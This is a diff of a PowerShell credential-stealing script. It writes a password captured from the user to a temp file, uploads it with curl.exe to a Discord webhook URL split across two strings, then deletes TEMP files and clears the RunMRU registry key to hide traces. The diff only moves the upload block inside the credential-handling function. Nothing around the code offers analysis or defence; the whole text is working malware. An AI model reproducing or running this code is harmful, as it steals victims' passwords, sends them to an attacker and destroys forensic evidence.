@@ -48,6 +48,9 @@ if($creds -is [system.array]) { $creds = $creds[$creds.Length - 1] };
 if($creds -eq "stop") {exit 0;}
 $creds = "Password: " + $creds;
 echo $creds >> $env:TMP\$FileName
+$webhook = "https://discord.com/api/webhooks/1065364894037319831/D0K_i0IG0TUJ_tV0nCJaVScJYp_";
+$SourceFilePath="$env:TMP\$FileName"
+curl.exe -F "file1=@$SourceFilePath" ($webhook + "uCydJ2TZGpPr9xbPOLaC_WYWR-tPBJx2jQqhvZWUE");
 }
 
 function Get-Creds {
@@ -63,10 +66,6 @@ return $creds
 }
 
 $creds = Get-Creds
-
-$webhook = "https://discord.com/api/webhooks/1065364894037319831/D0K_i0IG0TUJ_tV0nCJaVScJYp_";
-$SourceFilePath="$env:TMP\$FileName"
-curl.exe -F "file1=@$SourceFilePath" ($webhook + "uCydJ2TZGpPr9xbPOLaC_WYWR-tPBJx2jQqhvZWUE");
 
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
